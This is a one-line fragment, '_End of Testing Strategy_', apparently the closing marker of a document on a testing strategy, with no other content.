_End of Testing Strategy_
